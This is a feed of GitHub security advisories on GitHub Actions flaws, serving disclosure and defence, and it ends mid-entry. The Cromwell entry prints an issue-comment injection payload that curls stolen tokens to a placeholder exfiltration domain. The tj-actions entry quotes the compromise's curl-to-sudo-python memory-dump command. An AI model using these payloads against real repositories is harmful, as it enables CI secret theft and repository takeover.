<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/actions.rss</id>
    <title>Security Advisory for Github Actions</title>
    <updated>2025-06-13T00:46:15.737Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aactions"/>
    <subtitle>Security Advisory for Github Actions on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[broadinstitute/cromwell] Cromwell GitHub Actions Secrets exfiltration via `Issue_comment`]]></title>
        <id>https://github.com/advisories/GHSA-phf6-hm3h-x8qp</id>
        <link href="https://github.com/advisories/GHSA-phf6-hm3h-x8qp"/>
        <updated>2025-05-28T14:55:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Using <code>Issue_comment</code> on <code>.github/workflows/scalafmt-fix.yml</code> an attacker can inject malicious code using <code>github.event.comment.body</code>. By exploiting the vulnerability, it is possible to exfiltrate high privileged <code>GITHUB_TOKEN</code> which can be used to completely overtake the repo since the token has content privileges. In addition ,it is possible to exfiltrate also the secret:</p>
<ul>
<li><code>BROADBOT_GITHUB_TOKEN </code></li>
</ul>
<h3 id="details">Details</h3>
<p>The <code>Issue_comment</code> in GitHub Actions might be an injection path if the variable isn't handle as it should. In the following step it's vulnerable because it directly interpolates untrusted user input into a shell script.</p>
<pre><code>      - name: Check for ScalaFmt Comment
        id: check-comment
        run: |
          if [[ "${{ github.event_name }}" == "issue_comment" &amp;&amp; "${{ github.event.comment.body }}" == *"scalafmt"* ]]; then
            echo "::set-output name=comment-triggered::true"
          else
            echo "::set-output name=comment-triggered::false"
          fi
</code></pre>
<p>In this case, it is possible to exfiltrate <code>GITHUB_TOKEN</code> and <code>BROADBOT_GITHUB_TOKEN</code> secrets. </p>
<h3 id="poc">PoC</h3>
<p>To exploit the vulnerability an attacker can just drop a comment to any issue formed in the following way to exploit the vulnerability in the workflow <code>.github/workflows/update_pylon_issue.yml</code>.</p>
<pre><code>test" == "test" ]]; then
  &amp; curl -s -d "$B64_BLOB" "https://$YOUR_EXFIL_DOMAIN/token" &gt; /dev/null # 
</code></pre>
<p>To prove this is possible, we created an issue and we added a comment with the malicious code to extract the <code>GITHUB_TOKEN</code> and <code>BROADBOT_GITHUB_TOKEN</code> secret. With the <code>GITHUB_TOKEN</code> extracted we were able to push a new poc tag which has been deleted after a couple of minutes.</p>
<img src="https://github.com/user-attachments/assets/e2ebdb22-3d2d-467c-9326-34ca1e4b7ecf" alt="Screenshot 2025-05-20 at 23 17 14" width="1603">


<h3 id="impact">Impact</h3>
<p>Usually with GITHUB_TOKEN and write permissions, an attacker is able to completely overtake the repo. </p>
<pre><code>GITHUB_TOKEN Permissions
  Actions: write
  Attestations: write
  Checks: write
  Contents: write
  Deployments: write
  Discussions: write
  Issues: write
  Metadata: read
  Models: read
  Packages: write
  Pages: write
  PullRequests: write
  RepositoryProjects: write
  SecurityEvents: write
  Statuses: write
</code></pre>
<p>We also checked <code>BROADBOT_GITHUB_TOKEN</code> permission to check if we could move laterally to org level. In this case the token seems scoped to this specific repo but it gives an attacker persistence without the need of a valid <code>GITHUB_TOKEN</code>.
We suggest to rotate the <code>BROADBOT_GITHUB_TOKEN</code> token asap.</p>
<h3 id="fix">Fix</h3>
<ul>
<li>Avoid directly interpolating untrusted user input into a shell script. Use GitHub Actions input context safely like:</li>
</ul>
<pre><code>- name: Dump comment
  run: echo "Comment Body: $BODY"
  env:
    BODY: ${{ github.event.comment.body }}
</code></pre>
<p>This safely passes the comment as an environment variable rather than interpolating it in-place.</p>
<ul>
<li>Scope GIHTUB_TOKEN permissions to just what the actions needs to do. In this case, if it's specific for issues:</li>
</ul>
<pre><code>permissions:
  issues: write
</code></pre>
<p>Kindly reported by @darryk10 @AlbertoPellitteri @loresuso</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/broadinstitute/cromwell/security/advisories/GHSA-phf6-hm3h-x8qp">https://github.com/broadinstitute/cromwell/security/advisories/GHSA-phf6-hm3h-x8qp</a></li>
<li><a href="https://github.com/broadinstitute/cromwell/commit/dc2c26abd31149e296f73ce4e43a36c0c0317b0d">https://github.com/broadinstitute/cromwell/commit/dc2c26abd31149e296f73ce4e43a36c0c0317b0d</a></li>
<li><a href="https://github.com/advisories/GHSA-phf6-hm3h-x8qp">https://github.com/advisories/GHSA-phf6-hm3h-x8qp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phf6-hm3h-x8qp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-05-28T14:54:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bullfrogsec/bullfrog] Bullfrog's DNS over TCP bypasses domain filtering]]></title>
        <id>https://github.com/advisories/GHSA-m32f-fjw2-37v3</id>
        <link href="https://github.com/advisories/GHSA-m32f-fjw2-37v3"/>
        <updated>2025-05-15T17:23:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Using tcp breaks blocking and allows DNS exfiltration. </p>
<h3 id="poc">PoC</h3>
<pre><code>name: test
on:
  push:
    branches:
      - "*"

jobs:
  testBullFrog:
    runs-on: ubuntu-22.04
    steps:
      - name: Use google dns
        run: |
          sudo resolvectl dns eth0 1.1.1.1
          resolvectl status
      - name: Set up bullfrog to block everything
        uses: bullfrogsec/bullfrog@1472c28724ef13ea0adc54d0a42c2853d42786b1 # v0.8.2
        with:
           egress-policy: block
           allowed-domains: |
             *.github.com
      - name: Test connectivity
        run: |
          echo testing udp allowed ..
          dig api.github.com @1.1.1.1 || :
          echo testing tcp allowed ..
          dig api.github.com @1.1.1.1 +tcp || :

          echo testing udp not allowed
          dig api.google.com @1.1.1.1 || :
          echo testing tcp not allowed
          dig api.google.com @1.1.1.1 +tcp || :
</code></pre>
<h3 id="impact">Impact</h3>
<p>sandbox bypass</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/fba18a17-2d49-48cd-9aae-713e95b5270d"></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bullfrogsec/bullfrog/security/advisories/GHSA-m32f-fjw2-37v3">https://github.com/bullfrogsec/bullfrog/security/advisories/GHSA-m32f-fjw2-37v3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47775">https://nvd.nist.gov/vuln/detail/CVE-2025-47775</a></li>
<li><a href="https://github.com/bullfrogsec/bullfrog/commit/ae7744ae4b3a6f8ffc2e49f501e30bf1a43d4671">https://github.com/bullfrogsec/bullfrog/commit/ae7744ae4b3a6f8ffc2e49f501e30bf1a43d4671</a></li>
<li><a href="https://github.com/bullfrogsec/bullfrog/releases/tag/v0.8.4">https://github.com/bullfrogsec/bullfrog/releases/tag/v0.8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-m32f-fjw2-37v3">https://github.com/advisories/GHSA-m32f-fjw2-37v3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m32f-fjw2-37v3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-15T17:23:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OZI-Project/publish] OZI-Project/ozi-publish Code Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2487-9f55-2vg9</id>
        <link href="https://github.com/advisories/GHSA-2487-9f55-2vg9"/>
        <updated>2025-05-12T19:58:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Potentially untrusted data flows into PR creation logic. A malicious actor could construct a branch name that injects arbitrary code.</p>
<h3 id="patches">Patches</h3>
<p>This is patched in 1.13.6</p>
<h3 id="workarounds">Workarounds</h3>
<p>Downgrade to &lt;1.13.2</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections">Understanding the Risk of Script Injections</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/OZI-Project/publish/security/advisories/GHSA-2487-9f55-2vg9">https://github.com/OZI-Project/publish/security/advisories/GHSA-2487-9f55-2vg9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47271">https://nvd.nist.gov/vuln/detail/CVE-2025-47271</a></li>
<li><a href="https://github.com/OZI-Project/publish/commit/abd8524ec69800890529846b3ccfb09ce7c10b5c">https://github.com/OZI-Project/publish/commit/abd8524ec69800890529846b3ccfb09ce7c10b5c</a></li>
<li><a href="https://github.com/advisories/GHSA-2487-9f55-2vg9">https://github.com/advisories/GHSA-2487-9f55-2vg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2487-9f55-2vg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-12T19:58:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[step-security/harden-runner] Harden-Runner allows evasion of 'disable-sudo' policy]]></title>
        <id>https://github.com/advisories/GHSA-mxr3-8whj-j74r</id>
        <link href="https://github.com/advisories/GHSA-mxr3-8whj-j74r"/>
        <updated>2025-04-22T01:07:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Harden-Runner includes a policy option <code>disable-sudo</code> to prevent the GitHub Actions runner user from using sudo. This is implemented by removing the runner user from the sudoers file. However, this control can be bypassed as the runner user, being part of the docker group, can interact with the Docker daemon to launch privileged containers or access the host filesystem. This allows the attacker to regain root access or restore the sudoers file, effectively bypassing the restriction. </p>
<p>For an attacker to bypass this control, they would first need the ability to run their malicious code (e.g., by a supply chain attack similar to tj-actions or exploiting a Pwn Request vulnerability)) on the runner. This vulnerability has been fixed in Harden-Runner version <code>v2.12.0</code>.</p>
<h3 id="impact">Impact</h3>
<p>An attacker with the ability to run their malicious code on a runner configured with <code>disable-sudo: true</code> can escalate privileges to root using Docker, defeating the intended security control.</p>
<h3 id="affected-configuration">Affected Configuration</h3>
<p>â€¢	Harden-Runner configurations that use <code>disable-sudo: true</code> on GitHub-hosted runners or on ephemeral self-hosted VM-based runners.
â€¢	This issue does not apply to Kubernetes-based Actions Runner Controller (ARC) Harden-Runner.</p>
<h3 id="mitigation--fix">Mitigation / Fix</h3>
<p>This vulnerability has been fixed in Harden-Runner version <code>v2.12.0</code>. Users should migrate to the stronger <code>disable-sudo-and-containers</code> policy. This setting:
â€¢	Disables sudo access,
â€¢	Removes access to dockerd and containerd sockets,
â€¢	Uninstalls Docker from the runner entirely, preventing container-based privilege escalation paths.</p>
<h3 id="additional-improvements">Additional Improvements</h3>
<p>â€¢	The <code>disable-sudo</code> option will be deprecated in the future, as it does not sufficiently restrict privilege escalation on its own. 
â€¢	Harden-Runner now includes detections to alert on attempts to evade the <code>disable-sudo</code> policy.</p>
<h3 id="credits">Credits</h3>
<p>Reported by @loresuso and @darryk10. We would like to thank them for collaborating with us to mitigate the vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/step-security/harden-runner/security/advisories/GHSA-mxr3-8whj-j74r">https://github.com/step-security/harden-runner/security/advisories/GHSA-mxr3-8whj-j74r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32955">https://nvd.nist.gov/vuln/detail/CVE-2025-32955</a></li>
<li><a href="https://github.com/step-security/harden-runner/commit/0634a2670c59f64b4a01f0f96f84700a4088b9f0">https://github.com/step-security/harden-runner/commit/0634a2670c59f64b4a01f0f96f84700a4088b9f0</a></li>
<li><a href="https://github.com/step-security/harden-runner/releases/tag/v2.12.0">https://github.com/step-security/harden-runner/releases/tag/v2.12.0</a></li>
<li><a href="https://github.com/advisories/GHSA-mxr3-8whj-j74r">https://github.com/advisories/GHSA-mxr3-8whj-j74r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mxr3-8whj-j74r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-22T01:07:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[canonical/get-workflow-version-action] canonical/get-workflow-version-action can leak a partial GITHUB_TOKEN in exception output]]></title>
        <id>https://github.com/advisories/GHSA-26wh-cc3r-w6pj</id>
        <link href="https://github.com/advisories/GHSA-26wh-cc3r-w6pj"/>
        <updated>2025-04-03T13:26:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users using the <a href="https://github.com/canonical/get-workflow-version-action/blob/a5d53b08d254a157ea441c9819ea5002ffc12edc/action.yaml#L10"><code>github-token</code> input</a> are impacted.</p>
<p>If the <code>get-workflow-version-action</code> step fails, the exception output may include the GITHUB_TOKEN. If the full token is included in the exception output, GitHub will automatically redact the secret from the GitHub Actions logs. However, the token may be truncatedâ€”causing part of the GITHUB_TOKEN to be displayed in plaintext in the GitHub Actions logs.</p>
<p>Anyone with read access to the GitHub repository can view GitHub Actions logs. For public repositories, anyone can view the GitHub Actions logs.</p>
<p>The opportunity to exploit this vulnerability is limitedâ€”the GITHUB_TOKEN is automatically revoked when the job completes. However, there is an opportunity for an attack in the time between the GITHUB_TOKEN being displayed in the logs and the completion of the job. Normally this is less than a second, but it may be greater if <a href="https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#jobsjob_idstepscontinue-on-error"><code>continue-on-error</code></a> is used in the <code>get-workflow-version-action</code> step or if <a href="https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions#status-check-functions">status check functions</a> are used in a later step in the same job. For an example of an attack in the time between the GITHUB_TOKEN being displayed in the logs &amp; the completion of the job, see <a href="https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql/">https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql/</a></p>
<p>For users who passed the GITHUB_TOKEN to the <code>github-token</code> input, update to <code>v1.0.1</code>. Any secrets that were partially leaked while using <code>v1.0.0</code> should have already been revoked, since the GITHUB_TOKEN is automatically revoked when the job completes. However, in the unlikely event that an attack was executed using a GITHUB_TOKEN before it was revoked (as described above), users' repositories may still be impactedâ€”for example, a sophisticated attack could have used the GITHUB_TOKEN to push something to the repository.</p>
<p>The potential effects of an attack depend on the permissions of any GITHUB_TOKENs that were leaked. However, in a very sophisticated attack, even a GITHUB_TOKEN with read-only permissions can affect other GitHub Actions in the same repository if those actions use the Actions <a href="https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows">cache</a>. For more information, see the "But Wait, Thereâ€™s More" section of <a href="https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql/">https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql/</a> and <a href="https://github.com/AdnaneKhan/Cacheract">https://github.com/AdnaneKhan/Cacheract</a></p>
<p>If any users used a long-lived secret (e.g. a personal access token) instead of the GITHUB_TOKEN in the <code>github-token</code> input, they should immediately revoke that secret. The <code>get-workflow-version-action</code>'s documentation &amp; examples all instructed the user to use the GITHUB_TOKEN, so it is unlikely that users used a long-lived secret instead of the GITHUB_TOKEN.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in <code>v1.0.1</code>. Also, the <code>v1</code> tag has been updated to include the fix.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/canonical/get-workflow-version-action/issues/2">https://github.com/canonical/get-workflow-version-action/issues/2</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/canonical/get-workflow-version-action/security/advisories/GHSA-26wh-cc3r-w6pj">https://github.com/canonical/get-workflow-version-action/security/advisories/GHSA-26wh-cc3r-w6pj</a></li>
<li><a href="https://github.com/canonical/get-workflow-version-action/issues/2">https://github.com/canonical/get-workflow-version-action/issues/2</a></li>
<li><a href="https://github.com/canonical/get-workflow-version-action/commit/88281a62e96e1c0ef4df30352ae0668a9f3e3369">https://github.com/canonical/get-workflow-version-action/commit/88281a62e96e1c0ef4df30352ae0668a9f3e3369</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31479">https://nvd.nist.gov/vuln/detail/CVE-2025-31479</a></li>
<li><a href="https://github.com/advisories/GHSA-26wh-cc3r-w6pj">https://github.com/advisories/GHSA-26wh-cc3r-w6pj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-26wh-cc3r-w6pj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-02T22:36:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[reviewdog/action-setup] Multiple Reviewdog actions were compromised during a specific time period]]></title>
        <id>https://github.com/advisories/GHSA-qmg3-hpqr-gqvc</id>
        <link href="https://github.com/advisories/GHSA-qmg3-hpqr-gqvc"/>
        <updated>2025-05-13T07:44:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>reviewdog/action-setup@v1</code> was compromised March 11, 2025, between 18:42 and 20:31 UTC, with malicious code added that dumps exposed secrets to Github Actions Workflow Logs.</p>
<p>Other reviewdog actions that use <code>reviewdog/action-setup@v1</code> would also be compromised, regardless of version or pinning method:</p>
<ul>
<li>reviewdog/action-shellcheck</li>
<li>reviewdog/action-composite-template</li>
<li>reviewdog/action-staticcheck</li>
<li>reviewdog/action-ast-grep</li>
<li>reviewdog/action-typos</li>
</ul>
<h3 id="details">Details</h3>
<p>Malicious commit: <a href="https://github.com/reviewdog/action-setup/commit/f0d342d">https://github.com/reviewdog/action-setup/commit/f0d342d</a>
fix/retag via version upgrade: <a href="https://github.com/reviewdog/action-setup/commit/3f401fe">https://github.com/reviewdog/action-setup/commit/3f401fe</a></p>
<p>See the detailed report from Wiz Research: <a href="https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup">Wiz Blog Post</a> and reviewdog maintainer annoucement: <a href="https://github.com/reviewdog/reviewdog/issues/2079">reviewdog #2079</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/reviewdog/reviewdog/security/advisories/GHSA-qmg3-hpqr-gqvc">https://github.com/reviewdog/reviewdog/security/advisories/GHSA-qmg3-hpqr-gqvc</a></li>
<li><a href="https://github.com/reviewdog/reviewdog/issues/2079">https://github.com/reviewdog/reviewdog/issues/2079</a></li>
<li><a href="https://github.com/reviewdog/action-setup/commit/3f401fe1d58fe77e10d665ab713057375e39b887">https://github.com/reviewdog/action-setup/commit/3f401fe1d58fe77e10d665ab713057375e39b887</a></li>
<li><a href="https://github.com/reviewdog/action-setup/commit/f0d342d24037bb11d26b9bd8496e0808ba32e9ec">https://github.com/reviewdog/action-setup/commit/f0d342d24037bb11d26b9bd8496e0808ba32e9ec</a></li>
<li><a href="https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup">https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30154">https://nvd.nist.gov/vuln/detail/CVE-2025-30154</a></li>
<li><a href="https://github.com/advisories/GHSA-qmg3-hpqr-gqvc">https://github.com/advisories/GHSA-qmg3-hpqr-gqvc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmg3-hpqr-gqvc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-19T15:19:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tj-actions/changed-files] tj-actions changed-files through 45.0.7 allows remote attackers to discover secrets by reading actions logs.]]></title>
        <id>https://github.com/advisories/GHSA-mrrh-fwg8-r2c3</id>
        <link href="https://github.com/advisories/GHSA-mrrh-fwg8-r2c3"/>
        <updated>2025-03-24T14:23:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A supply chain attack compromised the <strong>tj-actions/changed-files</strong> GitHub Action, impacting over 23,000 repositories. Attackers retroactively modified multiple version tags to reference a malicious commit, exposing CI/CD secrets in workflow logs. The vulnerability existed between <strong>March 14 and March 15, 2025</strong>, and has since been mitigated. This poses a significant risk of unauthorized access to sensitive information.</p>
<p>This has been patched in <a href="https://github.com/tj-actions/changed-files/releases/tag/v46.0.1">v46.0.1</a>.</p>
<h3 id="details">Details</h3>
<p>The attack involved modifying the <strong>tj-actions/changed-files</strong> GitHub Action to execute a malicious Python script. This script extracted secrets from the Runner Worker process memory and printed them in GitHub Actions logs, making them publicly accessible in repositories with public workflow logs.  </p>
<h4 id="key-indicators-of-compromise-ioc">Key Indicators of Compromise (IoC):</h4>
<ul>
<li><strong>Malicious commit</strong>: <a href="https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67">0e58ed8671d6b60d0890c21b07f8835ace038e67</a>  </li>
<li><strong>Retroactively updated tags pointing to the malicious commit</strong>:  <ul>
<li><code>v1.0.0</code>: 0e58ed8671d6b60d0890c21b07f8835ace038e67  </li>
<li><code>v35.7.7-sec</code>: 0e58ed8671d6b60d0890c21b07f8835ace038e67  </li>
<li><code>v44.5.1</code>: 0e58ed8671d6b60d0890c21b07f8835ace038e67</li>
</ul>
</li>
</ul>
<h4 id="malicious-code-execution">Malicious Code Execution:</h4>
<p>The malicious script downloaded and executed a Python script that scanned memory for secrets, base64-encoded them, and logged them in the build logs:  </p>
<pre><code>B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3`
</code></pre>
<p>This script targeted the <strong>Runner Worker process</strong>, extracting and exfiltrating its memory contents.  </p>
<h3 id="proof-of-concept-poc">Proof of Concept (PoC)</h3>
<h4 id="steps-to-reproduce">Steps to Reproduce:</h4>
<ol>
<li>Create a GitHub Actions workflow using the <strong>tj-actions/changed-files</strong> action:</li>
</ol>
<pre><code class="language-yml">name: "tj-action changed-files incident"
on:
  pull_request:
    branches:
      - main
jobs:
  changed_files:
    runs-on: ubuntu-latest
    steps:
      - name: Get changed files
        id: changed-files
        uses: tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67
</code></pre>
<ol start="2">
<li>Run the workflow and inspect the logs in the Actions tab.  </li>
<li>Vulnerable workflows may display secrets in the logs.</li>
</ol>
<h4 id="detection">Detection:</h4>
<p>Analyze network traffic using <a href="https://github.com/step-security/harden-runner">Harden-Runner</a>, which detects unauthorized outbound requests to:  </p>
<ul>
<li><code>gist.githubusercontent.com</code></li>
</ul>
<p>Live reproduction logs:<br>ðŸ”— <a href="https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357">Harden-Runner Insights</a>  </p>
<p>This attack was detected by <strong>StepSecurity</strong> when anomaly detection flagged an unauthorized outbound network call to <code>gist.githubusercontent.com</code>.  </p>
<h3 id="duration-of-vulnerability">Duration of Vulnerability</h3>
<p>The vulnerability was active between <strong>March 14 and March 15, 2025</strong>.  </p>
<h3 id="action-required">Action Required</h3>
<ol>
<li><p><strong>Review your workflows executed between March 14 and March 15</strong>:  </p>
<ul>
<li>Check the <strong>changed-files</strong> section for unexpected output.  </li>
<li>Decode suspicious output using the following command:  <pre><code>echo 'xxx' | base64 -d | base64 -d
</code></pre>
</li>
<li>If the output contains sensitive information (e.g., tokens or secrets), revoke and rotate those secrets immediately.</li>
</ul>
</li>
<li><p><strong>Update workflows referencing the compromised commit</strong>:  </p>
<ul>
<li>If your workflows reference the malicious commit directly by its SHA, update them immediately to avoid using the compromised version.</li>
</ul>
</li>
<li><p><strong>Tagged versions</strong>:  </p>
<ul>
<li>If you are using tagged versions (e.g., <code>v35</code>, <code>v44.5.1</code>), no action is required as these tags have been updated and are now safe to use.</li>
</ul>
</li>
<li><p><strong>Rotate potentially exposed secrets</strong>:  </p>
<ul>
<li>As a precaution, rotate any secrets that may have been exposed during this timeframe to ensure the continued security of your workflows.</li>
</ul>
</li>
</ol>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Type of vulnerability</strong>: Supply chain attack, Secrets exposure, Information leakage  </li>
<li><strong>Who is impacted</strong>:  <ul>
<li>Over 23,000 repositories using <strong>tj-actions/changed-files</strong>.  </li>
<li>Organizations with public repositories are at the highest risk, as their logs may already be compromised.</li>
</ul>
</li>
<li><strong>Potential consequences</strong>:  <ul>
<li>Theft of CI/CD secrets (API keys, cloud credentials, SSH keys).  </li>
<li>Unauthorized access to source code, infrastructure, and production environments.  </li>
<li>Credential leaks in public repositories, enabling further supply chain attacks.</li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30066">https://nvd.nist.gov/vuln/detail/CVE-2025-30066</a></li>
<li><a href="https://github.com/tj-actions/changed-files/issues/2463">https://github.com/tj-actions/changed-files/issues/2463</a></li>
<li><a href="https://github.com/github/docs/blob/962a1c8dccb8c0f66548b324e5b921b5e4fbc3d6/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md?plain=1#L191-L193">https://github.com/github/docs/blob/962a1c8dccb8c0f66548b324e5b921b5e4fbc3d6/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md?plain=1#L191-L193</a></li>
<li><a href="https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised">https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised</a></li>
<li><a href="https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised">https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised</a></li>
<li><a href="https://github.com/chains-project/maven-lockfile/pull/1111">https://github.com/chains-project/maven-lockfile/pull/1111</a></li>
<li><a href="https://github.com/rackerlabs/genestack/pull/903">https://github.com/rackerlabs/genestack/pull/903</a></li>
<li><a href="https://news.ycombinator.com/item?id=43367987">https://news.ycombinator.com/item?id=43367987</a></li>
<li><a href="https://web.archive.org/web/20250315060250/https://github.com/tj-actions/changed-files/issues/2463">https://web.archive.org/web/20250315060250/https://github.com/tj-actions/changed-files/issues/2463</a></li>
<li><a href="https://github.com/espressif/arduino-esp32/issues/11127">https://github.com/espressif/arduino-esp32/issues/11127</a></li>
<li><a href="https://github.com/modal-labs/modal-examples/issues/1100">https://github.com/modal-labs/modal-examples/issues/1100</a></li>
<li><a href="https://github.com/tj-actions/changed-files/issues/2464">https://github.com/tj-actions/changed-files/issues/2464</a></li>
<li><a href="https://github.com/tj-actions/changed-files/blob/45fb12d7a8bedb4da42342e52fe054c6c2c3fd73/README.md?plain=1#L20-L28">https://github.com/tj-actions/changed-files/blob/45fb12d7a8bedb4da42342e52fe054c6c2c3fd73/README.md?plain=1#L20-L28</a></li>
<li><a href="https://sysdig.com/blog/detecting-and-mitigating-the-tj-actions-changed-files-supply-chain-attack-cve-2025-30066">https://sysdig.com/blog/detecting-and-mitigating-the-tj-actions-changed-files-supply-chain-attack-cve-2025-30066</a></li>
<li><a href="https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066">https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066</a></li>
<li><a href="https://www.sweet.security/blog/cve-2025-30066-tj-actions-supply-chain-attack">https://www.sweet.security/blog/cve-2025-30066-tj-actions-supply-chain-attack</a></li>
<li><a href="https://www.stream.security/post/github-action-supply-chain-attack-exposes-secrets-what-you-need-to-know-and-how-to-respond">https://www.stream.security/post/github-action-supply-chain-attack-exposes-secrets-what-you-need-to-know-and-how-to-respond</a></li>
<li><a href="https://github.com/tj-actions/changed-files/issues/2477">https://github.com/tj-actions/changed-files/issues/2477</a></li>
<li><a href="https://github.com/tj-actions/changed-files/releases/tag/v46.0.1">https://github.com/tj-actions/changed-files/releases/tag/v46.0.1</a></li>
<li><a href="https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066">https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066</a></li>
<li><a href="https://blog.gitguardian.com/compromised-tj-actions">https://blog.gitguardian.com/compromised-tj-actions</a></li>
<li><a href="https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5">https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5</a></li>
<li><a href="https://github.com/advisories/GHSA-mrrh-fwg8-r2c3">https://github.com/advisories/GHSA-mrrh-fwg8-r2c3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mrrh-fwg8-r2c3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-15T06:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github/codeql-action] GitHub PAT written to debug artifacts]]></title>
        <id>https://github.com/advisories/GHSA-vqf5-2xx6-9wfm</id>
        <link href="https://github.com/advisories/GHSA-vqf5-2xx6-9wfm"/>
        <updated>2025-03-31T21:55:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact-summary">Impact summary</h3>
